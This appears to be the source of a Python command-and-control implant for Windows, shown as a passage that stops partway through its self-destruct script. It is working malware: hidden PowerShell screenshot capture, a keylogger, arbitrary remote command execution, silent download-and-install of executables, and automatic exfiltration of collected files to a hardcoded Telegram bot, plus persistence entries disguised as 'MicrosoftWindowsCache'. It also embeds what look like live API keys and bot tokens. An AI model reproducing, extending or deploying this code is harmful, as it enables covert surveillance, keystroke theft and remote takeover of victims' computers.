#!/usr/bin/env python3
"""
C2 Autonomous Agent - Python Node v3.0
=======================================
Features:
- Persistent Task Manager (background loops)
- Auto-exfiltration after duration
- Resume tasks on reboot
- Screenshot, keylog, process monitoring
"""

import asyncio
import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, Dict, Any, List

# HTTP client
try:
    import httpx
except ImportError:
    print("[ERROR] Install httpx: pip install httpx")
    sys.exit(1)

# =============================================================================
# CONFIGURATION
# =============================================================================

# C2 Server URL
C2_SERVER = "https://c2-api.c2agent.workers.dev"

# API Key (must match wrangler.jsonc)
API_KEY = "VlB9zNP8Wv80gmH40VYRHaZDU4nU26vM"

# Telegram for file uploads
TELEGRAM_BOT_TOKEN = "8565861523:AAGGNFPQYuy-0opeCmqOAP5zP9VvqQEo96A"
TELEGRAM_ADMIN_ID = "6012569599"

# Polling interval
POLL_INTERVAL = 10  # seconds

# Data directories
DATA_DIR = Path(os.environ.get('LOCALAPPDATA', Path.home() / '.c2agent')) / 'C2Agent'
TASKS_FILE = DATA_DIR / 'persistent_tasks.json'
SCREENSHOTS_DIR = DATA_DIR / 'screenshots'
KEYLOGS_DIR = DATA_DIR / 'keylogs'

# Ensure directories exist
DATA_DIR.mkdir(parents=True, exist_ok=True)
SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
KEYLOGS_DIR.mkdir(parents=True, exist_ok=True)


# =============================================================================
# PERSISTENT TASK DATACLASS
# =============================================================================

@dataclass
class PersistentTask:
    task_id: str
    task_name: str
    action_type: str  # screenshot, keylog, process_check, custom
    interval_seconds: int
    duration_seconds: int
    started_at: float
    params: Dict[str, Any]
    data_path: str
    goal_id: Optional[str] = None
    is_running: bool = True
    
    def time_remaining(self) -> float:
        elapsed = time.time() - self.started_at
        return max(0, self.duration_seconds - elapsed)
    
    def is_expired(self) -> bool:
        return self.time_remaining() <= 0


# =============================================================================
# PERSISTENT TASK MANAGER
# =============================================================================

class PersistentTaskManager:
    """Manages background tasks that run for extended periods."""
    
    def __init__(self):
        self.tasks: Dict[str, PersistentTask] = {}
        self.running_loops: Dict[str, asyncio.Task] = {}
        self._load_tasks()
    
    def _load_tasks(self) -> None:
        """Load tasks from disk (resume after reboot)."""
        if TASKS_FILE.exists():
            try:
                with open(TASKS_FILE, 'r') as f:
                    data = json.load(f)
                    for task_data in data:
                        task = PersistentTask(**task_data)
                        if not task.is_expired():
                            task.is_running = True
                            self.tasks[task.task_id] = task
                            print(f"[RESUME] Loaded persistent task: {task.task_name}")
                        else:
                            print(f"[EXPIRED] Skipping expired task: {task.task_name}")
            except Exception as e:
                print(f"[ERROR] Failed to load tasks: {e}")
    
    def _save_tasks(self) -> None:
        """Persist tasks to disk."""
        try:
            data = [asdict(t) for t in self.tasks.values()]
            with open(TASKS_FILE, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"[ERROR] Failed to save tasks: {e}")
    
    def add_task(self, task: PersistentTask) -> None:
        """Register a new persistent task."""
        self.tasks[task.task_id] = task
        self._save_tasks()
        print(f"[TASK] Registered: {task.task_name} ({task.action_type}) for {task.duration_seconds}s")
    
    def remove_task(self, task_id: str) -> Optional[PersistentTask]:
        """Remove a task from registry."""
        task = self.tasks.pop(task_id, None)
        
        # Stop async loop
        if task_id in self.running_loops:
            self.running_loops[task_id].cancel()
            del self.running_loops[task_id]
            
        # Stop keylogger listener
        if task_id in ACTIVE_LISTENERS:
            try:
                print(f"[KEYLOG] Stopping listener for {task_id}")
                listener = ACTIVE_LISTENERS.pop(task_id)
                listener.stop()
            except Exception as e:
                print(f"[ERROR] Failed to stop listener: {e}")
                
        self._save_tasks()
        return task
    
    def get_task(self, task_id: str) -> Optional[PersistentTask]:
        return self.tasks.get(task_id)
    
    def list_tasks(self) -> List[PersistentTask]:
        return list(self.tasks.values())
    
    def has_running_tasks(self) -> bool:
        return any(t.is_running for t in self.tasks.values())


# =============================================================================
# BACKGROUND ACTION IMPLEMENTATIONS
# =============================================================================

async def action_screenshot(task: PersistentTask, iteration: int) -> Optional[str]:
    """Capture a FULL screenshot with proper High-DPI and Multi-Monitor support."""
    if platform.system() != "Windows":
        return None
    
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{task.task_id[:8]}_{timestamp}.png"
        filepath = SCREENSHOTS_DIR / filename
        
        # Robust PowerShell script that handles DPI scaling properly
        # Uses Win32 API directly to get REAL screen dimensions regardless of scaling
        ps_script = f'''
# Define all required Win32 APIs for proper DPI-aware screenshot
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;

public class ScreenCapture {{
    // DPI Awareness - must be called before any UI operations
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
    
    // Newer DPI awareness for Windows 10+
    [DllImport("shcore.dll")]
    public static extern int SetProcessDpiAwareness(int value);
    
    // Get actual screen metrics (not affected by DPI virtualization)
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);
    
    // Get device caps for real DPI
    [DllImport("gdi32.dll")]
    public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
    
    // Desktop window and DC
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);
    
    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
    
    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
                                      IntPtr hdcSrc, int xSrc, int ySrc, int rop);
    
    [DllImport("gdi32.dll")]
    public static extern bool DeleteDC(IntPtr hdc);
    
    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);
    
    // Virtual screen metrics for multi-monitor
    const int SM_XVIRTUALSCREEN = 76;
    const int SM_YVIRTUALSCREEN = 77;
    const int SM_CXVIRTUALSCREEN = 78;
    const int SM_CYVIRTUALSCREEN = 79;
    const int SRCCOPY = 0x00CC0020;
    
    public static void CaptureScreen(string filePath) {{
        // Set DPI awareness FIRST - try newest API, fall back to older
        try {{ SetProcessDpiAwareness(2); }} // Per-Monitor DPI Aware
        catch {{ SetProcessDPIAware(); }}
        
        // Get REAL virtual screen dimensions (all monitors combined)
        int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        
        if (width == 0 || height == 0) {{
            throw new Exception("Failed to get screen dimensions");
        }}
        
        // Use GDI to capture at actual resolution
        IntPtr desktopWnd = GetDesktopWindow();
        IntPtr desktopDC = GetWindowDC(desktopWnd);
        IntPtr memDC = CreateCompatibleDC(desktopDC);
        IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, width, height);
        IntPtr oldBitmap = SelectObject(memDC, hBitmap);
        
        // Copy screen to memory DC
        BitBlt(memDC, 0, 0, width, height, desktopDC, left, top, SRCCOPY);
        
        // Convert to managed bitmap and save
        SelectObject(memDC, oldBitmap);
        Bitmap bmp = Image.FromHbitmap(hBitmap);
        bmp.Save(filePath, ImageFormat.Png);
        
        // Cleanup
        bmp.Dispose();
        DeleteObject(hBitmap);
        DeleteDC(memDC);
        ReleaseDC(desktopWnd, desktopDC);
    }}
}}
'@

# Capture the screenshot
try {{
    [ScreenCapture]::CaptureScreen("{filepath}")
    Write-Host "Screenshot saved: {filepath}"
}} catch {{
    Write-Error "Screenshot failed: $_"
    exit 1
}}
'''
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
        )
        
        if filepath.exists():
            # Verify the file has reasonable size (not corrupted)
            file_size = filepath.stat().st_size
            if file_size > 1000:  # At least 1KB
                print(f"[SCREENSHOT] Captured: {filename} ({file_size // 1024}KB)")
                return str(filepath)
            else:
                print(f"[SCREENSHOT] File too small, likely corrupted: {file_size} bytes")
                filepath.unlink()  # Delete corrupted file
                return None
        else:
            error_msg = result.stderr[:300] if result.stderr else result.stdout[:300]
            print(f"[SCREENSHOT] Failed: {error_msg}")
            return None
            
    except Exception as e:
        print(f"[SCREENSHOT] Error: {e}")
        return None


# Global registry for active listeners
ACTIVE_LISTENERS = {}

async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
    """Log keystrokes using pynput."""
    if platform.system() != "Windows":
        return None
        
    try:
        from pynput import keyboard
    except ImportError:
        print("[ERROR] pynput not installed. Run: pip install pynput")
        return None

    log_path = KEYLOGS_DIR / f"activity_log_{task.task_id[:8]}.txt"
    
    # Start listener if not already running for this task
    if task.task_id not in ACTIVE_LISTENERS:
        print(f"[KEYLOG] Starting listener for task {task.task_id}")
        
        def on_press(key):
            try:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(log_path, 'a', encoding='utf-8') as f:
                    if hasattr(key, 'char'):
                        f.write(f"[{timestamp}] {key.char}\n")
                    else:
                        # Handle special keys
                        key_str = str(key).replace('Key.', '').upper()
                        f.write(f"[{timestamp}] [{key_str}]\n")
            except Exception as e:
                print(f"[KEYLOG ERROR] {e}")

        # Non-blocking listener
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        ACTIVE_LISTENERS[task.task_id] = listener
        
    # Check if listener is alive
    listener = ACTIVE_LISTENERS.get(task.task_id)
    if listener and not listener.is_alive():
        print(f"[KEYLOG] Listener died, restarting...")
        del ACTIVE_LISTENERS[task.task_id]
        # Will restart on next iteration
    
    return str(log_path)


async def action_process_check(task: PersistentTask, iteration: int) -> Optional[str]:
    """Check if specific processes are running."""
    if platform.system() != "Windows":
        return None
    
    try:
        target_process = task.params.get('process_name', 'notepad')
        
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", f"Get-Process {target_process} -ErrorAction SilentlyContinue | Select-Object Name, Id, CPU"],
            capture_output=True,
            text=True,
            timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
        )
        
        log_path = DATA_DIR / f"process_check_{task.task_id[:8]}.txt"
        timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(log_path, 'a', encoding='utf-8') as f:
            if result.stdout.strip():
                f.write(f"[{timestamp_str}] FOUND: {target_process}\n{result.stdout}\n")
                print(f"[PROCESS] {target_process} is RUNNING")
            else:
                f.write(f"[{timestamp_str}] NOT FOUND: {target_process}\n")
                print(f"[PROCESS] {target_process} is NOT running")
        
        return str(log_path)
        
    except Exception as e:
        print(f"[PROCESS] Error: {e}")
        return None


async def action_custom_command(task: PersistentTask, iteration: int) -> Optional[str]:
    """Execute a custom PowerShell command periodically."""
    if platform.system() != "Windows":
        return None
    
    try:
        command = task.params.get('command', 'Get-Date')
        
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command],
            capture_output=True,
            text=True,
            timeout=60,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
        )
        
        log_path = DATA_DIR / f"custom_{task.task_id[:8]}.txt"
        timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(f"\n[{timestamp_str}] Command: {command}\n")
            f.write(f"Output:\n{result.stdout}\n")
            if result.stderr:
                f.write(f"Errors:\n{result.stderr}\n")
        
        print(f"[CUSTOM] Executed command iteration {iteration}")
        return str(log_path)
        
    except Exception as e:
        print(f"[CUSTOM] Error: {e}")
        return None


# Action dispatcher
ACTION_HANDLERS = {
    'screenshot': action_screenshot,
    'keylog': action_keylog,
    'activity': action_keylog,  # alias
    'process_check': action_process_check,
    'custom': action_custom_command,
}


# =============================================================================
# ONE-TIME SCREENSHOT (for direct AI requests)
# =============================================================================

async def capture_single_screenshot() -> Tuple[str, bool]:
    """Capture a single screenshot and return the path. Handles DPI scaling properly."""
    if platform.system() != "Windows":
        return "Screenshots only supported on Windows", False
    
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_single_{timestamp}.png"
        filepath = SCREENSHOTS_DIR / filename
        
        # Same robust capture script as persistent task
        ps_script = f'''
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;

public class ScreenCapture {{
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
    
    [DllImport("shcore.dll")]
    public static extern int SetProcessDpiAwareness(int value);
    
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);
    
    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
    
    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
                                      IntPtr hdcSrc, int xSrc, int ySrc, int rop);
    
    [DllImport("gdi32.dll")]
    public static extern bool DeleteDC(IntPtr hdc);
    
    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);
    
    const int SM_XVIRTUALSCREEN = 76;
    const int SM_YVIRTUALSCREEN = 77;
    const int SM_CXVIRTUALSCREEN = 78;
    const int SM_CYVIRTUALSCREEN = 79;
    const int SRCCOPY = 0x00CC0020;
    
    public static string CaptureScreen(string filePath) {{
        try {{ SetProcessDpiAwareness(2); }}
        catch {{ SetProcessDPIAware(); }}
        
        int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        
        IntPtr desktopWnd = GetDesktopWindow();
        IntPtr desktopDC = GetWindowDC(desktopWnd);
        IntPtr memDC = CreateCompatibleDC(desktopDC);
        IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, width, height);
        IntPtr oldBitmap = SelectObject(memDC, hBitmap);
        
        BitBlt(memDC, 0, 0, width, height, desktopDC, left, top, SRCCOPY);
        
        SelectObject(memDC, oldBitmap);
        Bitmap bmp = Image.FromHbitmap(hBitmap);
        bmp.Save(filePath, ImageFormat.Png);
        
        bmp.Dispose();
        DeleteObject(hBitmap);
        DeleteDC(memDC);
        ReleaseDC(desktopWnd, desktopDC);
        
        return width + "x" + height;
    }}
}}
'@

$dims = [ScreenCapture]::CaptureScreen("{filepath}")
Write-Host "Captured: $dims"
'''
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
        )
        
        if filepath.exists() and filepath.stat().st_size > 1000:
            file_size = filepath.stat().st_size
            # Extract dimensions from output
            dims = "unknown"
            if result.stdout and "Captured:" in result.stdout:
                dims = result.stdout.split("Captured:")[-1].strip()
            
            return f"Screenshot captured: {filepath}\nResolution: {dims}\nSize: {file_size // 1024}KB", True
        else:
            return f"Screenshot failed: {result.stderr or result.stdout}", False
            
    except Exception as e:
        return f"Screenshot error: {e}", False


async def get_display_info() -> str:
    """Get detailed display information including DPI scaling."""
    if platform.system() != "Windows":
        return "Display info only available on Windows"
    
    try:
        ps_script = '''
Add-Type @'
using System;
using System.Runtime.InteropServices;

public class DisplayInfo {
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);
    
    [DllImport("shcore.dll")]
    public static extern int GetDpiForMonitor(IntPtr hmonitor, int dpiType, out uint dpiX, out uint dpiY);
    
    [DllImport("user32.dll")]
    public static extern IntPtr MonitorFromPoint(System.Drawing.Point pt, uint dwFlags);
}
'@

Add-Type -AssemblyName System.Windows.Forms

$output = @()
$output += "=== DISPLAY INFORMATION ==="
$output += ""

# Get all screens
$screens = [System.Windows.Forms.Screen]::AllScreens
$output += "Number of monitors: $($screens.Count)"
$output += ""

foreach ($screen in $screens) {
    $output += "--- Monitor: $($screen.DeviceName) ---"
    $output += "  Primary: $($screen.Primary)"
    $output += "  Bounds: $($screen.Bounds.Width)x$($screen.Bounds.Height)"
    $output += "  Working Area: $($screen.WorkingArea.Width)x$($screen.WorkingArea.Height)"
    $output += "  Position: ($($screen.Bounds.X), $($screen.Bounds.Y))"
    $output += ""
}

# Virtual screen (all monitors combined)
$output += "--- Virtual Screen (All Monitors) ---"
$vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
$output += "  Total Size: $($vs.Width)x$($vs.Height)"
$output += "  Origin: ($($vs.X), $($vs.Y))"

# DPI/Scaling info
$output += ""
$output += "--- DPI / Scaling ---"
$graphics = [System.Drawing.Graphics]::FromHwnd([IntPtr]::Zero)
$dpiX = $graphics.DpiX
$dpiY = $graphics.DpiY
$graphics.Dispose()

$scaling = [math]::Round($dpiX / 96 * 100)
$output += "  DPI: $dpiX x $dpiY"
$output += "  Scaling: $scaling%"

$output -join "`n"
'''
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
        )
        
        return result.stdout.strip() if result.stdout else f"Error: {result.stderr}"
        
    except Exception as e:
        return f"Display info error: {e}"


# =============================================================================
# TELEGRAM UPLOAD
# =============================================================================

async def upload_to_telegram(file_path: str, caption: str = "") -> Tuple[str, bool, Dict[str, Any]]:
    """Upload file to Telegram with file_id capture."""
    path = Path(file_path)
    telegram_data: Dict[str, Any] = {}
    
    if not path.exists():
        return f"File not found: {file_path}", False, telegram_data
    
    file_size = path.stat().st_size
    if file_size > 50 * 1024 * 1024:
        return "File too large for Telegram (>50MB)", False, telegram_data
    
    try:
        async with httpx.AsyncClient(timeout=120) as client:
            with open(path, 'rb') as f:
                files = {'document': (path.name, f)}
                data = {
                    'chat_id': TELEGRAM_ADMIN_ID,
                    'caption': caption[:1000] if caption else f"📁 {path.name}"
                }
                
                resp = await client.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                    data=data,
                    files=files
                )
                
                if resp.status_code == 200:
                    result = resp.json()
                    
                    if result.get('ok') and result.get('result'):
                        doc = result['result'].get('document', {})
                        file_id = doc.get('file_id', '')
                        
                        telegram_data = {
                            'file_id': file_id,
                            'file_name': path.name,
                            'file_size': file_size,
                        }
                        
                        print(f"[TELEGRAM] Uploaded: {path.name}")
                        return f"Uploaded {path.name} | file_id: {file_id[:20]}...", True, telegram_data
                
                return f"Telegram error: {resp.text[:200]}", False, telegram_data
                    
    except Exception as e:
        return f"Upload failed: {e}", False, telegram_data


async def send_telegram_message(text: str) -> bool:
    """Send a text message to Telegram."""
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': TELEGRAM_ADMIN_ID,
                    'text': text[:4000],
                    'parse_mode': 'HTML'
                }
            )
            return resp.status_code == 200
    except Exception as e:
        print(f"[TELEGRAM MSG] Error: {e}")
        return False


# =============================================================================
# PERSISTENT TASK LOOP
# =============================================================================

async def run_persistent_task(task_manager: PersistentTaskManager, task: PersistentTask, report_callback) -> None:
    """Run a persistent task loop until duration expires."""
    
    action_handler = ACTION_HANDLERS.get(task.action_type)
    if not action_handler:
        print(f"[ERROR] Unknown action type: {task.action_type}")
        return
    
    print(f"[LOOP START] {task.task_name} - {task.action_type} every {task.interval_seconds}s for {task.duration_seconds}s")
    
    iteration = 0
    collected_files: List[str] = []
    
    try:
        while not task.is_expired() and task.is_running:
            iteration += 1
            
            # Execute the action
            result_path = await action_handler(task, iteration)
            if result_path and result_path not in collected_files:
                collected_files.append(result_path)
            
            # Update task data path
            if result_path:
                task.data_path = result_path
                task_manager._save_tasks()
            
            # Calculate remaining time
            remaining = task.time_remaining()
            sleep_time = min(task.interval_seconds, remaining)
            
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
        
        # === TASK COMPLETED - AUTO EXFILTRATION ===
        print(f"[LOOP END] {task.task_name} completed after {iteration} iterations")
        
        # Collect all files for this task
        task_files = []
        
        # For screenshots, collect all files matching the task ID
        if task.action_type == 'screenshot':
            task_files = list(SCREENSHOTS_DIR.glob(f"screenshot_{task.task_id[:8]}_*.png"))
        elif task.action_type in ['keylog', 'activity']:
            task_files = list(KEYLOGS_DIR.glob(f"activity_log_{task.task_id[:8]}.txt"))
        elif task.action_type == 'process_check':
            task_files = list(DATA_DIR.glob(f"process_check_{task.task_id[:8]}.txt"))
        elif task.action_type == 'custom':
            task_files = list(DATA_DIR.glob(f"custom_{task.task_id[:8]}.txt"))
        
        # Zip if multiple files
        if len(task_files) > 1:
            import zipfile
            zip_path = DATA_DIR / f"{task.task_name}_{task.task_id[:8]}.zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for fp in task_files:
                    zf.write(fp, fp.name)
            upload_path = zip_path
            print(f"[ZIP] Created archive with {len(task_files)} files")
        elif len(task_files) == 1:
            upload_path = task_files[0]
        else:
            upload_path = None
        
        # Upload to Telegram
        if upload_path:
            caption = f"🎯 <b>Persistent Task Complete</b>\n\n📋 <b>Task:</b> {task.task_name}\n🔧 <b>Type:</b> {task.action_type}\n⏱ <b>Duration:</b> {task.duration_seconds}s\n🔄 <b>Iterations:</b> {iteration}"
            
            output, success, tg_data = await upload_to_telegram(str(upload_path), caption)
            
            # Report back to C2
            await report_callback(
                task_id=task.task_id,
                output=f"Persistent task '{task.task_name}' completed.\n{iteration} iterations over {task.duration_seconds}s.\n\nExfiltration: {output}",
                status='completed' if success else 'failed',
                telegram_file_id=tg_data.get('file_id'),
            )
        else:
            await report_callback(
                task_id=task.task_id,
                output=f"Persistent task '{task.task_name}' completed with no data collected.",
                status='completed'
            )
        
        # Cleanup: remove from task manager
        task_manager.remove_task(task.task_id)
        
        # Send notification
        await send_telegram_message(f"✅ <b>Task Finished:</b> {task.task_name}\n{iteration} iterations completed")
        
    except asyncio.CancelledError:
        print(f"[CANCELLED] {task.task_name}")
        task.is_running = False
        task_manager._save_tasks()
    except Exception as e:
        print(f"[LOOP ERROR] {task.task_name}: {e}")
        task.is_running = False
        task_manager._save_tasks()


# =============================================================================
# STANDARD TASK HANDLERS
# =============================================================================

def analyze_output(output: str, stderr: str, returncode: int) -> Dict[str, Any]:
    """Analyze command output to provide smarter feedback to the AI."""
    analysis = {
        'success': returncode == 0,
        'has_output': bool(output.strip()),
        'has_errors': bool(stderr.strip()),
        'output_type': 'unknown',
        'item_count': 0,
        'suggestions': []
    }
    
    output_lower = output.lower()
    stderr_lower = stderr.lower()
    
    # Detect common error patterns
    error_patterns = {
        'access denied': 'ACCESS_DENIED - May need elevated privileges',
        'not recognized': 'COMMAND_NOT_FOUND - Check command spelling',
        'cannot find path': 'PATH_NOT_FOUND - Verify the path exists',
        'cannot find': 'NOT_FOUND - Item does not exist',
        'permission denied': 'PERMISSION_DENIED - Insufficient permissions',
        'is not recognized': 'CMDLET_NOT_FOUND - Module may need importing',
        'no such file': 'FILE_NOT_FOUND - File does not exist',
        'timed out': 'TIMEOUT - Operation took too long',
        'connection refused': 'CONNECTION_REFUSED - Network/service issue',
    }
    
    for pattern, message in error_patterns.items():
        if pattern in output_lower or pattern in stderr_lower:
            analysis['error_type'] = message
            analysis['success'] = False
            break
    
    # Detect output type
    if output.strip():
        lines = output.strip().split('\n')
        analysis['line_count'] = len(lines)
        
        # Check if it's a list/table output
        if len(lines) > 2 and ('---' in output or all(len(l.split()) > 1 for l in lines[:3])):
            analysis['output_type'] = 'table'
            analysis['item_count'] = len(lines) - 1  # Subtract header
        elif len(lines) == 1:
            analysis['output_type'] = 'single_value'
        else:
            analysis['output_type'] = 'multi_line'
        
        # Check for file listings
        if any(ext in output_lower for ext in ['.exe', '.pdf', '.doc', '.txt', '.zip']):
            analysis['contains_files'] = True
            
        # Check for paths
        if ':\\' in output or '/' in output:
            analysis['contains_paths'] = True
    
    return analysis


async def execute_powershell(command: str) -> Tuple[str, bool]:
    """Execute PowerShell command with smart output analysis."""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command],
                capture_output=True,
                text=True,
                timeout=300,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
            )
        else:
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=300,
            )
        
        # Analyze the output
        analysis = analyze_output(result.stdout, result.stderr, result.returncode)
        
        # Build enhanced output
        output = result.stdout.strip()
        
        # Truncate very long outputs but keep useful info
        if len(output) > 10000:
            lines = output.split('\n')
            if len(lines) > 100:
                # Keep first 50 and last 20 lines
                output = '\n'.join(lines[:50]) + f'\n\n... [{len(lines) - 70} lines truncated] ...\n\n' + '\n'.join(lines[-20:])
            else:
                output = output[:10000] + '\n... [output truncated]'
        
        # Add stderr if present
        if result.stderr.strip():
            stderr_truncated = result.stderr.strip()[:2000]
            output += f"\n\n[STDERR]: {stderr_truncated}"
        
        # Add analysis metadata for AI
        if not analysis['success'] and 'error_type' in analysis:
            output += f"\n\n[ANALYSIS]: {analysis['error_type']}"
        
        if analysis.get('item_count', 0) > 0:
            output += f"\n[FOUND]: {analysis['item_count']} items"
        
        if not output:
            output = "(no output - command completed silently)"
            if analysis['success']:
                output += " [SUCCESS]"
        
        return output, analysis['success']
        
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]: Command exceeded 5 minute limit. Consider breaking into smaller operations.", False
    except FileNotFoundError:
        return "[ERROR]: PowerShell not found. Is this a Windows system?", False
    except Exception as e:
        return f"[EXECUTION_ERROR]: {type(e).__name__}: {e}", False


async def install_software(url: str) -> Tuple[str, bool]:
    """Download and silently install software."""
    try:
        filename = url.split('/')[-1].split('?')[0] or 'installer.exe'
        download_path = Path(os.environ.get('USERPROFILE', '/tmp')) / 'Downloads' / filename
        download_path.parent.mkdir(parents=True, exist_ok=True)
        
        async with httpx.AsyncClient(timeout=600, follow_redirects=True) as client:
            resp = await client.get(url)
            resp.raise_for_status()
            download_path.write_bytes(resp.content)
        
        if platform.system() == "Windows":
            ext = download_path.suffix.lower()
            
            if ext == '.msi':
                cmd = f'msiexec /i "{download_path}" /quiet /norestart'
            elif ext == '.exe':
                cmd = f'"{download_path}" /S /silent /quiet /VERYSILENT /NORESTART'
            else:
                return f"Unknown installer type: {ext}", False
            
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=600,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
            )
            
            if result.returncode in [0, 3010]:
                return f"Installed {filename} successfully", True
            else:
                return f"Install failed: {result.stderr}", False
        
        return "Installation only supported on Windows", False
        
    except Exception as e:
        return f"Install error: {e}", False


async def self_destruct() -> Tuple[str, bool]:
    """
    SELF DESTRUCT: Completely remove the agent from the system.
    - Removes scheduled tasks
    - Removes registry entries
    - Removes startup shortcuts
    - Deletes all files (agent, venv, data)
    - Terminates the agent process
    """
    if platform.system() != "Windows":
        return "Self-destruct only supported on Windows", False
    
    try:
        print("[SELF_DESTRUCT] Initiating cleanup sequence...")
        cleanup_report = []
        
        # Create a self-deleting batch script
        batch_script = f'''@echo off
echo [SELF_DESTRUCT] Phase 1: Stopping processes...
timeout /t 2 /nobreak >nul

REM Kill any remaining Python processes running agent.py
taskkill /F /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq *agent.py*" >nul 2>&1
taskkill /F /FI "IMAGENAME eq pythonw.exe" >nul 2>&1

echo [SELF_DESTRUCT] Phase 2: Removing persistence...

REM Remove Scheduled Tasks
schtasks /Delete /TN "C2Agent" /F >nul 2>&1
schtasks /Delete /TN "MicrosoftWindowsCache" /F >nul 2>&1

REM Remove Registry Run Keys
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1

REM Remove Startup Shortcuts
del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" /f /q >nul 2>&1
